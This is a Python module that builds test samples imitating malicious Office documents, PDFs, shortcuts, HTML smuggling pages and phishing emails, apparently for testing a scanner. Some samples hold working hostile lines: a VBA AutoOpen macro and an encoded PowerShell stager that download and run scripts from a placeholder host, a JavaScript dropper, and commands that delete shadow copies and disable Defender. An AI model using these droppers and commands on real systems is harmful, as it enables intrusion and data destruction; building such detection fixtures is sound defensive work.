"""Builders for inert test samples.

These only imitate the *structure* of malicious files (magic bytes, archive layout,
markers); none of them contains working code.
"""

from __future__ import annotations

import io
import zipfile
from email.message import EmailMessage


def fake_pe() -> bytes:
    """DOS/PE headers only: detected as an executable, but runs nothing."""
    data = bytearray(b"MZ" + b"\x00" * 0x3A + (0x40).to_bytes(4, "little"))
    data += b"PE\x00\x00" + b"\x00" * 64
    return bytes(data)


def make_zip(files: dict[str, bytes], encrypted: set[str] = frozenset()) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    raw = bytearray(buf.getvalue())
    # zipfile cannot write encrypted entries; set the "encrypted" flag bit instead,
    # which is all a listing (and a scanner) can see without the password.
    for name in encrypted:
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            pos = 0
            while (pos := raw.find(sig, pos)) != -1:
                flag_at = pos + (6 if sig == b"PK\x03\x04" else 8)
                name_len_at = pos + (26 if sig == b"PK\x03\x04" else 28)
                header = 30 if sig == b"PK\x03\x04" else 46
                n = int.from_bytes(raw[name_len_at:name_len_at + 2], "little")
                if raw[pos + header:pos + header + n] == name.encode():
                    raw[flag_at] |= 0x01
                pos += 4
    return bytes(raw)


def fake_docm() -> bytes:
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "word/document.xml": b"<w:document/>",
        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0 inert",
    })


def fake_remote_template_docx() -> bytes:
    rels = (b'<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
            b'officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" '
            b'TargetMode="External"/></Relationships>')
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "word/document.xml": b"<w:document/>",
        "word/_rels/settings.xml.rels": rels,
    })


SMUGGLING_HTML = (
    "<html><body><p>Loading document...</p><script>"
    "var d = atob('" + "QUFB" * 1200 + "');"
    "var b = new Blob([d], {type: 'application/octet-stream'});"
    "var a = document.createElement('a'); a.href = URL.createObjectURL(b);"
    "a.download = 'invoice.iso'; a.click();"
    "</script></body></html>"
).encode()


def message_with(attachments: list[tuple[str | None, str, bytes]], body: str = "See attached.") -> bytes:
    """attachments: (filename, content_type, data)."""
    msg = EmailMessage()
    msg["From"] = "sender@example.com"
    msg["To"] = "victim@corp.test"
    msg["Subject"] = "Documents"
    msg["Date"] = "Wed, 23 Sep 2026 08:00:00 +0000"
    msg["Message-ID"] = "<att@example.com>"
    msg.set_content(body)
    for filename, ctype, data in attachments:
        maintype, subtype = ctype.split("/", 1)
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=filename)
    return msg.as_bytes()


# --------------------------------------------------------------------------- Day 6 payload samples
# All inert: macros/scripts are text that is never run; "executables" are header stubs.

import base64 as _b64
import struct as _struct
import zlib as _zlib

from cfbwriter import build_cfb, build_vba_project, ole10native

MALICIOUS_VBA = (
    'Attribute VB_Name = "Module1"\r\n'
    "Sub AutoOpen()\r\n"
    '    Dim s: Set s = CreateObject("WScript.Shell")\r\n'
    '    s.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.9/p.ps1\')"\r\n'
    "End Sub\r\n"
)


def property_set(props: dict[int, object]) -> bytes:
    """A SummaryInformation-style property set stream (strings and FILETIME ints)."""
    body = b""
    entries = []
    for pid, value in props.items():
        entries.append((pid, len(body)))
        if isinstance(value, int):
            body += _struct.pack("<IQ", 0x40, value)
        else:
            raw = value.encode("cp1252") + b"\x00"
            raw += b"\x00" * (-len(raw) % 4)
            body += _struct.pack("<II", 0x1E, len(raw)) + raw
    header_len = 8 + 8 * len(entries)
    section = _struct.pack("<II", header_len + len(body), len(entries))
    section += b"".join(_struct.pack("<II", pid, header_len + off) for pid, off in entries) + body
    fmtid = bytes.fromhex("e0859ff2f94f6810ab9108002b27b3d9")
    return (_struct.pack("<HHI", 0xFFFE, 0, 0x00020006) + b"\x00" * 16 + _struct.pack("<I", 1)
            + fmtid + _struct.pack("<I", 48) + section)


FILETIME_2026 = (1_790_000_000 + 11_644_473_600) * 10_000_000


def malicious_doc() -> bytes:
    """Legacy Word document: VBA project, metadata and an embedded package."""
    streams = {f"Macros/{k}": v for k, v in build_vba_project({"Module1": MALICIOUS_VBA}).items()}
    streams["WordDocument"] = b"\xec\xa5" + b"\x00" * 600
    streams["\x05SummaryInformation"] = property_set({4: "Jane Attacker", 8: "builder-pc", 12: FILETIME_2026, 18: "Microsoft Office Word"})
    streams["ObjectPool/_1234/\x01Ole10Native"] = ole10native("invoice.exe", fake_pe())
    return build_cfb(streams)


def malicious_docm() -> bytes:
    vba_bin = build_cfb(build_vba_project({"Module1": MALICIOUS_VBA}))
    document = ('<w:document><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
                '<w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
                '</w:p></w:body></w:document>')
    rels = ('<Relationships>'
            '<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
            'Target="http://203.0.113.9/payload.sct" TargetMode="External"/>'
            '<Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="https://login.microsoftonline.com.verify-account.test/" TargetMode="External"/>'
            '<Relationship Id="r3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
            'Target="\\\\203.0.113.9\\share\\logo.png" TargetMode="External"/>'
            '</Relationships>')
    core = ('<cp:coreProperties><dc:creator>Jane Attacker</dc:creator><cp:lastModifiedBy>builder-pc</cp:lastModifiedBy>'
            '<dcterms:created xsi:type="dcterms:W3CDTF">2026-09-01T10:00:00Z</dcterms:created></cp:coreProperties>')
    embedded = build_cfb({"\x01Ole10Native": ole10native("invoice.exe", fake_pe())})
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "word/document.xml": document.encode(),
        "word/_rels/document.xml.rels": rels.encode(),
        "word/vbaProject.bin": vba_bin,
        "word/embeddings/oleObject1.bin": embedded,
        "word/activeX/activeX1.xml": b"<ax/>",
        "docProps/core.xml": core.encode(),
        "docProps/app.xml": b"<Properties><Application>Microsoft Office Word</Application><Company>Evil Ltd</Company></Properties>",
    })


def xlm_workbook() -> bytes:
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "xl/workbook.xml": b'<workbook><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames></workbook>',
        "xl/macrosheets/sheet1.xml": b'<xm:macrosheet><sheetData><row><c><f>EXEC("cmd /c calc.exe")</f></c>'
                                     b'<c><f>HALT()</f></c></row></sheetData></xm:macrosheet>',
    })


def equation_rtf() -> bytes:
    obj = build_cfb({"\x01Ole10Native": ole10native("update.exe", fake_pe())})
    return (b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Equation.3}\\objw10\\objh10{\\*\\objdata "
            + obj.hex().encode() + b"}}}")


def malicious_pdf() -> bytes:
    hidden = (b"1 0 obj << /Type /Action /S /JavaScript /JS (app.launchURL\\('http://203.0.113.9/x'\\); "
              b"eval\\(unescape\\('%61%6c'\\)\\)) >> endobj")
    objstm = _zlib.compress(hidden)
    embedded = _zlib.compress(fake_pe())
    parts = [
        b"%PDF-1.7\n",
        b"1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /EmbeddedFiles 7 0 R >> >> endobj\n",
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n",
        b"3 0 obj << /Type /Page /Annots [4 0 R] >> endobj\n",
        b"4 0 obj << /Type /Annot /Subtype /Link /A << /S /URI /URI (https://paypa1-secure.test/login) >> >> endobj\n",
        b"5 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length " + str(len(objstm)).encode()
        + b" >>\nstream\n" + objstm + b"\nendstream endobj\n",
        b"6 0 obj << /S /Launch /Win << /F (cmd.exe) /P (/c start invoice.exe) >> >> endobj\n",
        b"7 0 obj << /Names [(invoice.exe) 8 0 R] >> endobj\n",
        b"8 0 obj << /Type /Filespec /F (invoice.exe) /EF << /F 9 0 R >> >> endobj\n",
        b"9 0 obj << /Type /EmbeddedFile /Filter /FlateDecode /Length " + str(len(embedded)).encode()
        + b" >>\nstream\n" + embedded + b"\nendstream endobj\n",
        b"10 0 obj << /S /J#61va#53cript /J#53 (this.exportDataObject\\({cName:'x'}\\)) >> endobj\n",
        b"trailer << /Root 1 0 R >>\n%%EOF\n",
    ]
    return b"".join(parts)


def clean_pdf() -> bytes:
    return (b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            b"3 0 obj << /Type /Page >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n")


POWERSHELL_STAGER = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/stage2.ps1')"


def malicious_lnk() -> bytes:
    """A shortcut that runs hidden PowerShell with an encoded command and a PDF icon."""
    enc = _b64.b64encode(POWERSHELL_STAGER.encode("utf-16-le")).decode()
    flags = 0x02 | 0x10 | 0x20 | 0x40 | 0x80  # LinkInfo, WorkingDir, Arguments, IconLocation, Unicode
    header = (_struct.pack("<I", 0x4C) + bytes.fromhex("0114020000000000c000000000000046")
              + _struct.pack("<II", flags, 0x20) + b"\x00" * 24 + _struct.pack("<IIIH", 0, 0, 7, 0) + b"\x00" * 10)
    target = b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\x00"
    linkinfo_header = 0x1C
    linkinfo = _struct.pack("<IIIIIII", linkinfo_header + len(target), linkinfo_header, 1, 0, linkinfo_header, 0, 0)
    linkinfo += target

    def sdata(text):
        return _struct.pack("<H", len(text)) + text.encode("utf-16-le")

    args = " " * 60 + f"-NoP -W Hidden -Enc {enc}"
    strings = sdata("C:\\Windows\\System32") + sdata(args) + sdata("C:\\Program Files\\Adobe\\Acrobat.exe,13 invoice.pdf")
    tracker = _struct.pack("<II", 96, 0xA0000003) + _struct.pack("<II", 88, 0) + b"DESKTOP-ATTACK01".ljust(16, b"\x00") + b"\x00" * 64
    return header + linkinfo + strings + tracker + _struct.pack("<I", 0)


def malicious_onenote() -> bytes:
    guid = bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac")
    hta = b'<html><hta:application id="x"/><script language="VBScript">CreateObject("WScript.Shell").Run "cmd /c calc"</script></html>'
    header = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3") + b"\x00" * 64
    return header + guid + _struct.pack("<QI", len(hta), 0) + b"\x00" * 8 + hta + b"\x00" * 16


JS_DROPPER = (b'var sh = new ActiveXObject("WScript.Shell");\n'
              b'var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", "http://203.0.113.9/a.exe", false);\n'
              b'sh.Run("cmd /c start %TEMP%\\\\a.exe", 0);\n'
              b'eval(String.fromCharCode(97,108,101,114,116));\n')
BAT_RANSOM = b"@echo off\r\nvssadmin delete shadows /all /quiet\r\npowershell -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"\r\n"
PS1_ENCODED = ("powershell.exe -NoP -NonInteractive -W Hidden -Enc "
               + _b64.b64encode(POWERSHELL_STAGER.encode("utf-16-le")).decode()).encode()


# --------------------------------------------------------------------------- Day 7 samples

from cfbwriter import build_msg  # noqa: E402

TRANSPORT_HEADERS = (
    "Received: from mail.evil.test (mail.evil.test [81.2.69.160])\r\n by mx.corp.test with ESMTPS id 1;\r\n"
    " Tue, 22 Sep 2026 10:00:05 +0000\r\n"
    "Authentication-Results: mx.corp.test; spf=fail smtp.mailfrom=evil.test;\r\n dmarc=fail header.from=paypal.com\r\n"
    "From: PayPal <service@paypal.com>\r\n"
    "Reply-To: billing@paypa1-support.test\r\n"
    "To: Bob <bob@corp.test>\r\n"
    "Subject: Your account is limited\r\n"
    "Date: Tue, 22 Sep 2026 10:00:00 +0000\r\n"
    "Message-ID: <phish1@evil.test>\r\n"
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/alternative; boundary=\"orig\"\r\n"
)


def phish_msg() -> bytes:
    return build_msg(
        subject="Your account is limited", transport_headers=TRANSPORT_HEADERS,
        body="Verify now: https://paypa1-support.test/login",
        html=b'<html><body><a href="https://paypa1-support.test/login">https://www.paypal.com</a></body></html>',
        sender=("PayPal", "service@paypal.com"), recipients=[("Bob", "bob@corp.test", 1)],
        attachments=[{"filename": "Invoice.pdf.exe", "mime": "application/octet-stream", "data": fake_pe()}],
        submit_time=1_790_071_200,
    )


def sent_item_msg() -> bytes:
    """A message without transport headers (e.g. from Sent Items), embedding another message."""
    inner = dict(subject="Original phish", transport_headers=TRANSPORT_HEADERS,
                 body="Verify now: https://paypa1-support.test/login", sender=("PayPal", "service@paypal.com"))
    return build_msg(
        subject="FW: suspicious", body="Please check the attached message.",
        sender=("Bob", "bob@corp.test"),
        recipients=[("SOC", "soc@corp.test", 1), ("Alice", "alice@corp.test", 2)],
        attachments=[{"filename": "Original phish.msg", "message": inner}],
        submit_time=1_790_074_800,
    )


def forwarded_eml() -> bytes:
    """A user-reported phish: the suspicious message attached as message/rfc822."""
    import email.policy
    from email.message import EmailMessage
    inner = (b"Received: from vps.evil.test (vps.evil.test [81.2.69.160]) by mx.corp.test; Tue, 22 Sep 2026 10:00:05 +0000\r\n"
             b"From: \"IT Helpdesk\" <helpdesk@corp-test-support.test>\r\nTo: bob@corp.test\r\n"
             b"Subject: Password expires today\r\nDate: Tue, 22 Sep 2026 10:00:00 +0000\r\nMessage-ID: <x@evil.test>\r\n"
             b"Content-Type: text/html\r\n\r\n"
             b'<a href="http://203.0.113.9/owa/login">https://mail.corp.test/owa</a>\r\n')
    outer = EmailMessage(policy=email.policy.default)
    outer["From"] = "bob@corp.test"
    outer["To"] = "soc@corp.test"
    outer["Subject"] = "Fwd: Password expires today"
    outer["Date"] = "Tue, 22 Sep 2026 11:00:00 +0000"
    outer["Message-ID"] = "<fwd@corp.test>"
    outer.set_content("Is this legit?")
    from email.parser import BytesParser
    outer.add_attachment(BytesParser(policy=email.policy.default).parsebytes(inner))
    return outer.as_bytes()
